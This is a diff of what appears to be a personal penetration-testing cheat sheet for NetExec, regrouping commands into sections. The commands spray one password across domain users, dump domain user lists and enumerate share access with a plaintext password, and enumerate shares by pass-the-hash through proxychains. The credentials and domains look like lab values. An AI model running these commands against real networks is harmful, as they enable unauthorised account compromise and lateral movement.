@@ -4,25 +4,34 @@ description: Various Net Exec commands for every scenario
 
 # NXC - Net Exec
 
-#### Find Domain Users (domain creds)
+### Password Spraying
 
+{% tabs %}
+{% tab title="SMB" %}
 ```shellscript
-nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > users.txt
-```
-
-#### Spray one password to different Users on the DC&#x20;
-
-```shellscript
+# Spray one password to all domain users
 nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
 ```
+{% endtab %}
 
-#### Share Enumeration (domain creds)
+{% tab title="Second Tab" %}
+
+{% endtab %}
+{% endtabs %}
+
+### Domain Users
 
 ```shellscript
-nxc smb 192.168.242.0/24 -u stephanie -p 'LegmanTeamBenzoin!!' --shares
+nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > domain-users.txt
 ```
 
-#### Share Enumeration (Using PtH) - check access to all shares
+### Enumerate Share Access as a Domain User
+
+```shellscript
+nxc smb domain-ips.txt -u stephanie -p 'LegmanTeamBenzoin!!' --shares
+```
+
+### Enumerate Share Access using PtH
 
 ```shellscript
 proxychains4 nxc smb domain-hosts.txt -H fdf36048c1cf88f5630381c5e38feb8e -u wario -d medtech.com --shares
